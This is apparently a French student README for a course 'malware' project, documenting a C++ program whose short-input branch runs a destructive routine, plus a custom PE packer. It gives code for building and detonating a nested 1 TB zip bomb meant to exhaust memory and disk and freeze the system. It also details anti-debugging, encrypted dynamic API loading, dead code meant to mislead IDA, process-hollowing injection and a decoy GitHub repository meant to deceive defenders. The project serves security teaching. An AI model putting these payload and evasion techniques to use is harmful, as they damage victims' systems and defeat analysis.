# Mal-where ?
Fonctions Principales du Projet Malware du groupe 3 : Ewan Decima, Garance Frolla et Ely Marthouret

Nous avons décidé de faire un goodware et d'obfuscer son fonctionnement

---

## Table des matières

1. [MaliciousEcho](#maliciousecho---fonction-de-routage)
2. [Custom](#custom---fonction-de-validation-cryptographique)
3. [Devil](#devil---fonction-destructrice)
4. [Dépendances](#dependances-techniques)
5. [Packer](#packer)
6. [Fake GitHub](#fake-github-repository) 
7. [Responsabilité](#responsabilite)


---

## MaliciousEcho - Fonction de routage

Point d'entrée principal qui **route l'exécution** vers deux chemins différents selon la longueur de la chaîne d'entrée :
- Si la chaîne est **valide** (≥ 8 caractères) → appelle `custom_func` -> si les conditions sont remplies elle affiche str donc c'est un goodware
- Si la chaîne est **invalide** (< 8 caractères) → appelle `devil_code`

### Signature
```cpp
template <typename F, typename G>
int malicious_echo(const std::string& str, F devil_code, G custom_func)
```

### Paramètres
- **`str`** : Chaîne d'entrée à valider
- **`devil_code`** : Fonction callback appelée en cas d'échec de validation (chaîne trop courte)
- **`custom_func`** : Fonction callback appelée en cas de succès de validation

### Exemple d'utilisation
```cpp
malicious_echo("short", devil_wrapper, custom);     // Chaîne < 8 → appelle devil()
malicious_echo("valid_string_test", devil_wrapper, custom);  // Chaîne ≥ 8 → appelle custom()
```

---

## Custom - Fonction de validation cryptographique


Fonction de **validation cryptographique** avec détection de débogueur qui :
1. Détecte si un débogueur est présent
2. Si débogueur → **obfuscation** avec fake recursion
3. Sinon → **chiffrement + triple hashing** pour valider un secret

### Signature
```cpp
void custom(const std::string& str)
```

### Constantes secrètes
```cpp
const std::string HASH = "496bb7cdfa1a478b66289234332955e5f2e93f113207af12af4bbe2cdba345c9";
const std::string SALT = "-90hZ4if?9AwL29F&b";
const std::string WIN_MESSAGE = "V0u5_4v32_7R0UVé_l4_80nn3_Clé_8r4V0?!";
```

### Fonctionnement

#### **Branche 1 : Débogueur détecté** 
```cpp
if (debug) {
    // Obfuscation avec fake recursion (10 itérations de factorielle)
    int i = fake_recursive(10, make_wrapper(&factoriel), 10);
    if (i < 0) {
        std::cout << i << std::endl;
    }
    std::cout << str << std::endl;  // Affiche simplement la chaîne
}
```

**Techniques anti-debug utilisées** :
-  `LoadIsDebuggerPresentFunction()` - Chargement dynamique de `IsDebuggerPresent()`
-  `LoadPrintfFunction()` - Chargement dynamique de `printf` pour l'affichage.
-  `fake_recursive()` - Obfuscation par fausse récursion
-  `compose_n_times()` - Ralentissement de l'exécution

#### **Branche 2 : Pas de débogueur** 

```
┌──────────────────────────┐
│  Récupère USERNAME       │
└──────────┬───────────────┘
           │
           ▼
   ┌───────────────┐
   │ USERNAME ==   │
   │    SALT ?     │
   └───────┬───────┘
           │
    ┌──────┴──────┐
   NON           OUI
    │             │
    ▼             ▼
┌─────────┐   ┌──────────────┐
│ Process │   │ Ralentit +   │
│ crypto  │   │ Affiche str  │
└────┬────┘   └──────────────┘
     │
     ▼
┌──────────────────────┐
│ Cipher(USERNAME)     │
│ encrypt(str)         │
└──────┬───────────────┘
       │
       ▼
┌──────────────────────┐
│ hash1 = hash(enc)    │
│ hash2 = hash(hash1)  │
│ hash3 = hash(hash2)  │
└──────┬───────────────┘
       │
       ▼
   ┌─────────────┐
   │ hash3 ==    │
   │   HASH ?    │
   └─────┬───────┘
         │
    ┌────┴────┐
   OUI       NON
    │         │
    ▼         ▼
┌─────────┐ ┌──────────┐
│ Affiche │ │ Affiche  │
│ WIN_MSG │ │   str    │
└─────────┘ └──────────┘
```

**Algorithme cryptographique** :
1. **Récupération de la clé** : `USERNAME` de l'environnement Windows
2. **Chiffrement XOR** : `encrypted = Cipher(USERNAME).encrypt(str)`
3. **Triple hashing** :
4. **Comparaison** : Si `toHexString(hash3) == HASH` → **Victoire (en fait c'est un hash impossible par sa longueur)**

### Techniques d'obfuscation
- **Anti-debug** : Détection via `IsDebuggerPresent()`
- **Chargement dynamique de `IsDebuggerPresent`** : La fonction n'est pas importée statiquement. Le nom "IsDebuggerPresent" est déchiffré à l'exécution en utilisant le nom d'utilisateur (`USERNAME`) comme clé, puis l'adresse est récupérée via `GetProcAddress` dans `kernel32.dll`.
- **Chargement dynamique de `Printf`** : Pour masquer l'utilisation de fonctions d'affichage standard, `printf` est chargé dynamiquement depuis `msvcrt.dll`. Son nom est déchiffré en utilisant **l'architecture du processeur** (par exemple "x64" ou "x86") comme clé de déchiffrement.
- **Fake recursion** : `fake_recursive(10, factoriel, 10)` pour brouiller l'analyse statique
- **Composition** : `compose_n_times(&factoriel, 10-12, 10)` pour ralentir l'exécution
- **Chiffrement dynamique** : Clé basée sur `USERNAME` (spécifique à chaque machine)


---

## Devil - Fonction destructrice


### Objectif
Fonction **destructrice** qui exécute trois actions malveillantes en séquence :
1.  **Rickroll** - Animation ASCII
2.  **Zipbomb** - Création d'une bombe zip de 1 TB
3.  **Détonation** - Décompression de la zipbomb (saturation disque)

###  Code
```cpp
void devil() {
    // 1. Rickroll
    roll(100);
    
    // 2. Creation de la zipbomb
    const char* filename = "devil_zipbomb.bin";
    create_zipbomb(filename, 1024 * 1024, 10);  // 1 TO (1024 GB), 10 niveaux
    
    // 3. Decompression de la zipbomb
    detonate_zipbomb(filename, 10, 1024 * 1024);
}
```

###  Étapes détaillées

#### **Étape 1 : Rickroll** 🎵
```cpp
roll(100);  // 100ms de délai entre frames
```

**Fonctionnalités** :
- Affiche **149 frames** d'animation ASCII de Rick Astley
- Sur Windows : ouvre un **nouveau terminal** via `cmd /k`
- Utilise `Sleep()` (Windows) ou `clock()` (portable) pour les délais
- Efface l'écran entre chaque frame (`cls` / `clear`)


#### **Étape 2 : Création de zipbomb** 
```cpp
create_zipbomb("devil_zipbomb.bin", 1024 * 1024, 10);
```

**Paramètres** :
- **Taille** : `1024 * 1024` MB = **1 TÉRAOCTET** (1 TB)
- **Niveaux** : `10` niveaux de compression récursive
- **Fichier** : `devil_zipbomb.bin`

**Principe** :
- Crée un fichier zip compressé de quelques KB
- Une fois décompressé, génère **1 TB de données**
- Compression récursive : ZIP dans ZIP dans ZIP... (10 fois)

#### **Étape 3 : Détonation** 
```cpp
detonate_zipbomb("devil_zipbomb.bin", 10, 1024 * 1024);
```

**Action destructrice** :
- Décompresse **récursivement** les 10 niveaux
- Écrit **1 To** de données sur le disque
- Sature le disque dur
- Peut faire **Crasher** le systeme (out of memory, disk full)

---

## Schéma de flux global

```
                    ┌────────────────────────┐
                    │   malicious_echo(str)  │
                    └───────────┬────────────┘
                                │
                    ┌───────────┴───────────┐
                    │  Validation longueur  │
                    │    str.length() >= 8  │
                    └───────────┬───────────┘
                                │
                    ┌───────────┴───────────┐
                    │                       │
                  ÉCHEC                  SUCCÈS
               (str < 8)              (str ≥ 8)
                    │                       │
                    ▼                       ▼
        ┌─────────────────────┐  ┌──────────────────────┐
        │      devil()        │  │      custom(str)     │
        └──────────┬──────────┘  └──────────┬───────────┘
                   │                        │
        ┌──────────┼──────────┐             │
        │          │          │             ▼
        ▼          ▼          ▼   ┌─────────────────────┐
    ┌──────┐  ┌────────┐  ┌──────┐│ IsDebuggerPresent() │
    │ Rick │  │Zipbomb │  │Detone││                     │
    │ roll │  │Create  │  │      │└──────────┬──────────┘
    └──────┘  └────────┘  └──────┘           │
                                   ┌─────────┴─────────┐
                                   │                   │
                                 DEBUG              NO DEBUG
                                   │                   │
                                   ▼                   ▼
                        ┌──────────────────┐  ┌─────────────────┐
                        │  fake_recursive  │  │   Encryption +  │
                        │   (obfuscation)  │  │  Triple Hash    │
                        │                  │  │                 │
                        │  Affiche str     │  │  Vérification   │
                        └──────────────────┘  │  secret         │
                                              └────────┬────────┘
                                                       │
                                              ┌────────┴────────┐
                                              │                 │
                                            MATCH            NO MATCH
                                              │                 │
                                              ▼                 ▼
                                    ┌─────────────┐      ┌─────────────┐
                                    │ WIN_MESSAGE │      │ Affiche str │
                                    └─────────────┘      │ echo normal │
                                                         └─────────────┘
                                    
                                           
```

---

## Dépendances techniques


### `Cipher` : Chiffrement XOR avec clé


### `custom_hash` : Fonction de hashing personnalisée

Le hash est un hash personnalisé, voici son fonctionnement : 
**Input**

La fonction custom_hash accepte soit une chaîne C++ standard (std::string), soit un C-string (const char).
Lorsque l’entrée est un const char nul, la fonction retourne directement la valeur 0.
Dans tous les autres cas, la chaîne est traitée caractère par caractère, chaque caractère étant interprété comme un octet non signé pour éviter les effets indésirables liés au signe.

Transformation

L’algorithme commence avec une valeur de départ égale à 5381, valeur traditionnelle dans l’algorithme DJB2.
Chaque caractère entraîne alors une succession d’opérations destinées à diffuser l’information de manière progressive :

La première étape consiste à multiplier la valeur de hachage courante par 33. Cette opération, héritée de DJB2, augmente rapidement la dispersion des valeurs.
Le caractère courant est ensuite ajouté directement à la valeur de hachage, ce qui introduit son influence brute dans l’état interne.

Une phase de mélange conditionnel est appliquée selon que la position du caractère (index) est paire ou impaire.
Pour les indices pairs, la valeur est soumise à une rotation circulaire vers la gauche de 7 bits, puis mélangée par un opérateur XOR avec le caractère décalé vers la gauche.
Pour les indices impairs, la valeur subit plutôt une rotation vers la droite de 5 bits, suivie d’un XOR avec le caractère décalé vers la droite.
Les rotations sont effectuées de manière circulaire, ce qui signifie que les bits sortants d’un côté sont réinjectés de l’autre, assurant ainsi une diffusion homogène sur tout le mot de 32 bits.

Une constante fixe (0xDEADBEEF) est ensuite mélangée via un XOR. Cette étape agit comme une perturbation supplémentaire destinée à réduire les motifs répétitifs et à renforcer l’effet avalanche.

L’ensemble de ces opérations, répétées pour chaque caractère, garantit qu’une petite variation dans la chaîne d’entrée produit une grande variation dans le résultat final.

**Output**

La fonction retourne un entier non signé de 32 bits.
Le résultat est déterministe pour une même entrée mais extrêmement sensible à la moindre modification, y compris la casse ou la position d’un caractère.
Cette fonction est adaptée aux structures de données nécessitant un hachage rafﬁné (comme les tables de hachage) mais n’a pas vocation à fournir une sécurité cryptographique. 



### `fake_recursive` : Obfuscation avec du rien
Prend une fonction f, ses arguments et un entier x, fait tourner x fois f(arg) puis renvoie f(arg)
Utilise un wrapper pour être plus universelle en fonction du type de retour
**Objectif** : Remplir IDA de fausses recursion


### `compose_n_times` : Composition de fonctions
Cette fonction implémente la composition f(f(...f(arg)...)) en utilisant la récursivité.
 Elle suppose que le résultat de f(arg) a le même type que l'argument 'arg' pour que la composition puisse continuer.
 Prend en argument :
Type de la fonction (pointeur de fonction ou foncteur)
Type de l'argument initial
La fonction à appliquer
Le nombre d'appels à effectuer
arg L'argument initial
 Et return Le résultat final de la composition.
 **Objectif** : Remplir IDA de fausses recursion ou faire un compose legitime

### `LoadIsDebuggerPresentFunction` : Chargement dynamique d'API Windows

**Objectif** : Charger dynamiquement `IsDebuggerPresent()` de manière obfusquée pour éviter la détection statique.

**Fonctionnement** :
1. **Chargement dynamique de kernel32.dll** :
   ```cpp
   HMODULE kernel32 = LoadLibraryA("kernel32.dll");
   ```
   - Charge la DLL Windows contenant les fonctions système

2. **Déchiffrement du nom de la fonction** :
   - Le nom "IsDebuggerPresent" n'apparaît **jamais en clair** dans le code
   - Stocké sous forme de bytes chiffrés : `{0x10, 0x33, 0xf3, 0x05, 0x38, 0xf3}`
   - Récupère le `USERNAME` comme clé de déchiffrement
   - Utilise `Cipher` pour déchiffrer : `decryptBytes(encryptedBytes)`
   - Résultat : chaîne "IsDebuggerPresent" en mémoire uniquement

3. **Récupération de l'adresse de la fonction** :
   ```cpp
   type_IsDebuggerPresent func = (type_IsDebuggerPresent)GetProcAddress(kernel32, functionName.c_str());
   ```
   - `GetProcAddress()` retourne un pointeur vers la fonction
   - Cast en `type_IsDebuggerPresent` (typedef de pointeur de fonction)

4. **Retourne le pointeur** :
   - Peut être appelé comme une fonction normale : `func()`
   - Retourne `BOOL` : `TRUE` si débogueur détecté, `FALSE` sinon

**Avantages de cette technique** :
-  **Anti-détection statique** : Le nom "IsDebuggerPresent" n'apparaît pas dans les strings du binaire
-  **Anti-analyse** : Nécessite de connaître le USERNAME pour déchiffrer
-  **Obfuscation** : Les outils d'analyse automatique ne détectent pas l'appel à IsDebuggerPresent

### `Cipher` : Chiffrement XOR avec clé étendue

**Algorithme** : Chiffrement XOR symétrique avec génération de clé étendue

**Principe de base** :
```
texte_chiffré[i] = texte_clair[i] XOR clé_étendue[i]
texte_clair[i] = texte_chiffré[i] XOR clé_étendue[i]  (déchiffrement identique)
```

**Génération de la clé étendue** :

La clé fournie (ex: USERNAME) est trop courte pour chiffrer de longs messages. La fonction `generateExtendedKey()` crée une clé de la longueur exacte des données :

```cpp
Pour chaque position i dans les données :
    1. base = key[i % keyLen]           // Répétition cyclique de la clé
    2. transform = (i / keyLen) & 0xFF  // Valeur dépendant de la position
    3. mixed = base XOR transform       // Mélange initial
    4. mixed = ROL(mixed, 3)            // Rotation circulaire de 3 bits (diffusion)
    5. mixed = mixed XOR ((i XOR keyLen) & 0xFF)  // Second mélange
    6. clé_étendue[i] = mixed
```

**Exemple** :
```
Clé originale : "USER" (4 bytes)
Message : "Hello World" (11 bytes)

Génération clé étendue (11 bytes) :
Position 0: 'U' XOR 0 → rotation → mélange → K₀
Position 1: 'S' XOR 0 → rotation → mélange → K₁
Position 2: 'E' XOR 0 → rotation → mélange → K₂
Position 3: 'R' XOR 0 → rotation → mélange → K₃
Position 4: 'U' XOR 1 → rotation → mélange → K₄  (différent de K₀ !)
...
```

**Chiffrement** :
```cpp
encrypted[i] = message[i] XOR extendedKey[i]
```

**Caractéristiques** :
-  **Symétrique** : même fonction pour chiffrer et déchiffrer
-  **Rapide** : simple opération XOR
-  **Clé variable** : accepte n'importe quelle longueur de clé
-  **Non-répétitif** : même si la clé de base se répète, la clé étendue varie à chaque position
-  **Sécurité** : Résiste à l'analyse fréquentielle mais pas cryptographiquement sûr (non recommandé pour des secrets critiques)

**Encodages supportés** :
- **PLAIN** : Clé en texte clair
- **BASE64** : Clé encodée en Base64 (ex: "VVNFUg==")
- **BASE32** : Clé encodée en Base32 (ex: "KVXUWZQ=")

### `roll()` : Animation rickroll 
Affiche les images du rickroll en ASCII (juste trèès long)

### `create_zipbomb()` : Génération de zipbomb compressée

**Principe** : Créer un petit fichier qui, une fois décompressé, produit une quantité massive de données.

**Algorithme** :

```cpp
void create_zipbomb(const char* filename, unsigned long size_mb, int levels)
```

**Étapes** :

1. **Création des données initiales** :
   ```cpp
   const unsigned long total_size = size_mb * 1024 * 1024;  // Conversion MB → bytes
   std::vector<unsigned char> data(total_size, 0);           // Rempli de zéros
   ```
   - Crée un vecteur rempli de zéros (données hautement compressibles)
   - Pour 1 TB : `1024 * 1024 MB = 1,099,511,627,776 bytes`

2. **Première compression** (niveau 0 → 1) :
   ```cpp
   std::vector<unsigned char> compressed = Compressor::compress(data, 9);
   ```
   - Utilise zlib avec niveau de compression maximum (9)
   - Les zéros se compressent à un ratio ~1000:1
   - Exemple : 1 GB → ~1 MB

3. **Libération de la mémoire des données non compressées** :
   ```cpp
   data.clear();
   std::vector<unsigned char>().swap(data);  // Force la désallocation
   ```

4. **Compression récursive** (niveaux 2 à N) :
   ```cpp
   for (int level = 2; level <= levels; ++level) {
       std::vector<unsigned char> next_level = Compressor::compress(compressed, 9);
       compressed = next_level;
   }
   ```
   - Compresse les données déjà compressées
   - Chaque niveau réduit encore la taille
   - Avec 10 niveaux : données compressées 10 fois récursivement

5. **Écriture sur disque** :
   ```cpp
   std::ofstream out(filename, std::ios::binary);
   out.write(reinterpret_cast<const char*>(&compressed[0]), compressed.size());
   ```

**Fichier final** :
- Taille sur disque : **< 1 KB**
- Taille décompressée : **1 TB**
- Format : Données compressées zlib imbriquées 10 fois

**Pourquoi c'est efficace** :
-  Les zéros se compressent extrêmement bien (ratio >1000:1)
-  Compression récursive amplifie l'effet
-  Fichier minuscule qui explose en mémoire à la décompression

### `detonate_zipbomb()` : Décompression récursive

**Principe** : Décompresser récursivement les niveaux de la zipbomb jusqu'à saturation du disque/mémoire.

**Algorithme** :

```cpp
void detonate_zipbomb(const char* filename, int levels, unsigned long expected_size)
```

**Étapes** :

1. **Lecture du fichier compressé** :
   ```cpp
   std::ifstream in(filename, std::ios::binary);
   std::vector<unsigned char> compressed_data(
       (std::istreambuf_iterator<char>(in)),
       std::istreambuf_iterator<char>()
   );
   ```
   - Lit le fichier zipbomb complet en mémoire
   - Taille initiale : quelques centaines de bytes

2. **Décompression récursive par niveaux** :
   ```cpp
   std::vector<unsigned char> current = compressed_data;
   
   for (int level = levels; level >= 1; --level) {
       // Estimation de la taille après décompression
       unsigned long estimated_size = current.size() * 1000;
       if (level == 1) {
           estimated_size = expected_size;  // Taille finale (1 TB)
       }
       
       // Décompression zlib
       std::vector<unsigned char> decompressed = Compressor::decompress(current, estimated_size);
       current = decompressed;  // Prépare pour le niveau suivant
   }
   ```

**Explosion progressive** :

```
Niveau 10 (départ) : ~500 bytes (fichier sur disque)
    ↓ decompress()
Niveau 9 : ~500 KB (×1000)
    ↓ decompress()
Niveau 8 : ~500 MB (×1000)
    ↓ decompress()
Niveau 7 : ~500 GB (×1000)
    ↓ decompress()
...
Niveau 1 : 1 TB (1,099,511,627,776 bytes)
```

**Ce qui se passe** :

1. **Niveau 10 → 9** : 500 bytes → 500 KB (mémoire OK)
2. **Niveau 9 → 8** : 500 KB → 500 MB (mémoire OK)
3. **Niveau 8 → 7** : 500 MB → 500 GB (**Mémoire critique !**)
4. **Niveau 7 → 6** : Tentative d'allouer des centaines de GB
   - **Out of Memory** : Le système crashe
   - OU essaie de swapper sur disque
5. **Niveaux suivants** : 
   - Si le swap fonctionne → **saturation progressive du disque**
   - Écriture de centaines de GB de données swap
   - **Disque plein** → système inutilisable

**Mécanismes destructeurs** :

1. **Saturation RAM** :
   - Chaque décompression multiplie la taille par ~1000
   - Système tente d'allouer plusieurs GB en mémoire
   - Processus tués par OOM killer (Linux) ou crash (Windows)

2. **Saturation Disque** :
   - Si swap activé : système écrit les données en swap
   - Remplit le disque à 100%
   - Plus d'espace pour les logs, temp files, etc.

3. **Freeze système** :
   - Thrashing : système passe son temps à swapper
   - CPU à 100% pour gérer la mémoire
   - Interface graphique freeze
   - Nécessite hard reboot

**Gestion des erreurs** :
```cpp
try {
    // Décompression...
} catch (const std::exception& e) {
    // Silent - ne révèle rien sur l'échec
}
```
- Silencieux : pas de message d'erreur
- Si échec : ne fait rien (mais les dégâts peuvent déjà être faits)

**Pourquoi c'est dangereux** :
-  **Allocation exponentielle** : croissance par facteur 1000 à chaque niveau
-  **Pas de limite** : tente d'allouer toute la taille demandée
-  **Irréversible** : une fois lancé, difficile à arrêter
-  **Système non-responsive** : freeze avant même la fin

---
# Packer
## Objectif

Ce packer PE transforme un exécutable Windows 32-bit en un ficher packé qui 

- Préserve les ressources originals (`.rsrc`)
- Compresse et chiffre un payload
- Utilse le Precess Hollowing pour l'exécution
- Obfusque les appels API critiques
Génère des identifiants aléatoires (magic number ...)

## Architecture globale

```
┌─────────────────┐
│  EXE Original   │
│   (32-bit PE)   │
└────────┬────────┘
         │
         ▼
┌─────────────────────────┐
│  Validation PE 32-bit   │
│  Extraction .rsrc       │
└────────┬────────────────┘
         │
         ▼
┌─────────────────────────┐
│  Compression RLE        │
│  (ratio ~10-30%)        │
└────────┬────────────────┘
         │
         ▼
┌─────────────────────────┐
│  Chiffrement XOR        │
│  Clé 128-bit aléatoire  │
└────────┬────────────────┘
         │
         ▼
┌─────────────────────────┐
│  Génération stub C      │
│  avec magic aléatoire   │
└────────┬────────────────┘
         │
         ▼
┌─────────────────────────┐
│  Compilation GCC        │
│  (stub unpacker)        │
└────────┬────────────────┘
         │
         ▼
┌─────────────────────────┐
│  Injection sections:    │
│  - .rsrc (préservée)    │
│  - .tls (packed data)   │
└────────┬────────────────┘
         │
         ▼
┌─────────────────────────┐
│  EXE Packé Final        │
│  Process Hollowing      │
└─────────────────────────┘

```
## Composants Principaux

### 1. PackedSection - Structure des données packées 

```
struct PackedSection {
    DWORD magic;          // Identifiant aléatoire (0x12XXXXXX)
    DWORD unpacked_size;  // Taille originale
    DWORD packed_size;    // Taille compressée
    DWORD key[4];         // Clé XOR 128-bit
};
```

**Rôle** : Header stocké au début de la section `.tls`, contient les métadonnées nécessaires au dépacking.


### 2. **Compression RLE** - Run-Length Encoding

**Algorithme** :
```
Données identiques répétées (count > 3) :
    [0xFF] [count] [valeur]
    
Valeur 0xFF littérale :
    [0xFF] [0x00]
    
Autres valeurs :
    [valeur] (inchangée)
```

**Performances**:
- Ratio moyen : 10-30% (dépend du contenu)
- Efficace sur : code machine, sections nulles, padding
- Moins efficace sur : données aléatoires, ressources compressées


### 3. Chiffrement XOR - Symétrique 128-bit

- Clé unique par exécuition du packer
- Stocké en clair dans `PackedSection.key`
- Déchiffrement identique au chiffrement (XOR symétrique)

### 4. Génération du Stub - Code C obfusqué

**Technique d'obuscation**

#### a) Fragmentation de chaînes

``` c
#define S1 "Cre" "ate" "Pro" "cess" "A"
#define S2 "Nt" "Unmap" "View" "Of" "Section"
#define S3 "ntd" "ll." "dll"
```

#### b) Chargement dynamique d'API

```c
char procName[50];
strcpy(procName, S1);  // Reconstruction runtime
pCreateProcessA myCreateProcess = 
    (pCreateProcessA)GetProcAddress(GetModuleHandleA("kernel32.dll"), procName);
```

#### c) Anti-debug timing

```c
volatile DWORD antiDebug = GetTickCount();
// ... code critique ...
DWORD tickDiff = GetTickCount() - antiDebug;
if (tickDiff > 1000) return 1;  // Débogueur détecté
```

#### d) Code mort

```c
DWORD temp1 = 0, temp2 = 0;
temp1 = GetCurrentProcessId();
if (temp1 == 0) return 1;  // Jamais vrai
temp2 = sections[i].Characteristics;  // Lecture inutile
```




### 5. **Process Hollowing** - Injection en mémoire 


**Séquence complète** :
```
┌─────────────────────────────┐
│ 1. Création processus       │
│    CREATE_SUSPENDED         │
└──────────┬──────────────────┘
           │
           ▼
┌─────────────────────────────┐
│ 2. GetThreadContext         │
│    Récupère EIP, PEB        │
└──────────┬──────────────────┘
           │
           ▼
┌─────────────────────────────┐
│ 3. NtUnmapViewOfSection     │
│    Vide la mémoire originale│
└──────────┬──────────────────┘
           │
           ▼
┌─────────────────────────────┐
│ 4. VirtualAllocEx           │
│    Alloue nouvelle région   │
└──────────┬──────────────────┘
           │
           ▼
┌─────────────────────────────┐
│ 5. WriteProcessMemory       │
│    Copie headers + sections │
└──────────┬──────────────────┘
           │
           ▼
┌─────────────────────────────┐
│ 6. Relocation des adresses  │
│    Si base address change   │
└──────────┬──────────────────┘
           │
           ▼
┌─────────────────────────────┐
│ 7. SetThreadContext         │
│    EAX = EntryPoint         │
└──────────┬──────────────────┘
           │
           ▼
┌─────────────────────────────┐
│ 8. ResumeThread             │
│    Exécution du payload     │
└─────────────────────────────┘
```


### 6. **Présevation des Ressources**

**Processus** :
1. **Extraction** : Lit la section `.rsrc` de l'EXE original
2. **Stockage** : Copie dans `originalResourceData`
3. **Réinjection** : Ajoute une nouvelle section `.rsrc` au stub

**Structure finale** :
```
┌────────────────────┐
│  Stub unpacker     │
│  (compiled code)   │
├────────────────────┤
│  .rsrc             │ ← Ressources originales
│  (preserved)       │    (icons, strings, dialogs)
├────────────────────┤
│  .tls              │ ← Payload compressé + chiffré
│  (packed data)     │    + PackedSection header
└────────────────────┘
```

**But :**
- La commande `strings m.exe` montre les mêmes chaînes que l'original
- Analyse superficielle ne détecte rien d'anormale

Cela nous permet de mettre l'URL d'un faux github contenant du code source d'un malware afin de piéger nos adversaires


### 7. Magic Number - Identification unique

**Génération**

```c
DWORD generateObfuscatedMagic() {
    srand((unsigned int)(time(NULL) ^ GetTickCount()));
    return 0x12000000 | (rand() & 0x00FFFFFF);
}
```

**Format :** `0x12XXXXXX`où `XXXXXX` est aléatoire

**Utilisation :**
- Stocké dans `PackedSection.magic`
- Codé en dur dans le stub généré: `if(testSec->magic == 0x12AB34CD)`
- Permet au stub de retrouvé sa section de données

## Flux d'exécution du Stub

### Phase 1 : Initialisation 

```
1. GetModuleFileNameA()     → Récupère chemin de l'EXE
2. CreateFileA()            → Ouvre le fichier
3. CreateFileMappingA()     → Map en mémoire
4. MapViewOfFile()          → Accès aux données
```

### Phase 2 : Recherche du Payload

```
5. Parse PE headers
6. Scan sections
7. Trouve section avec magic == 0x12XXXXXX
8. Récupère PackedSection*
```

### Phase 3 : Décompression

```
9. VirtualAlloc(packed_size)      → Buffer chiffré
10. memcpy(packedData)            → Copie données
11. decryptXOR()                  → Déchiffrement
12. VirtualAlloc(unpacked_size)   → Buffer décompressé
13. decompressRLE()               → Décompression
```

### Phase 4 : Process Hollowing

```
14. CreateProcessA(SUSPENDED)     → Crée processus vide
15. GetThreadContext()            → Récupère contexte
16. NtUnmapViewOfSection()        → Vide mémoire
17. VirtualAllocEx()              → Alloue nouvelle zone
18. WriteProcessMemory()          → Copie PE complet
19. Relocation                    → Ajuste adresses
20. SetThreadContext(EAX=EP)      → Redirige exécution
21. ResumeThread()                → Lance payload
```

## Utilisation 

```
# Basique
packer.exe program.exe

# Spécifier output
packer.exe program.exe -o packed.exe

# Mode debug (messages dans le stub)
packer.exe program.exe -o packed.exe -d
```

### Sortie Console
```
[+] Found valid 32-bit PE file
[*] Original size: 45056 bytes
[*] Found .rsrc section in original file
    Size: 8192 bytes
[*] Section name: .tls
[*] Generated magic: 0x12AB34CD
[+] Compressed: 12345 bytes (27.4%)
[+] Encryption complete
[+] Obfuscated stub compiled successfully
[*] Injecting resources and packed data into stub...

[+] Successfully packed!
[+] Original size:  45056 bytes
[+] Compression:    27.4%
[+] Resources:      Preserved (8192 bytes)
[+] Output file:    packed.exe
```
# Fake GitHub Repository
Le packer a été conçu de telle sorte que la commande strings main.exe révèle le contenu du payload. Cela nous a permis
d’intégrer dans l’exécutable un faux README (`FAKE_README.md`) renvoyant vers un faux dépôt GitHub, accessible à 
l’adresse suivante : [moise7000/Malware-Telecom](https://github.com/moise7000/Malware-Telecom). Cela avait pour but de 
tromper nos adversaires en leur donnant le code source d'un malware. 


Par ailleurs, un fichier .pdp contenant de nombreuses fausses fonctions a également été laissé afin d’induire les défenseurs en erreur.


---

# Responsabilité

Ce projet est destiné à l'**apprentissage de la sécurité informatique**. Les auteurs déclinent toute responsabilité quant à l'utilisation malveillante de ce code.

**Usage autorisé** : Environnements de test isolés (VM avec snapshots)
**Usage interdit** : Systèmes de production, réseaux non autorisés

Rédigé par Garance Frolla, Ewan Decima et Ely Marthouret

---
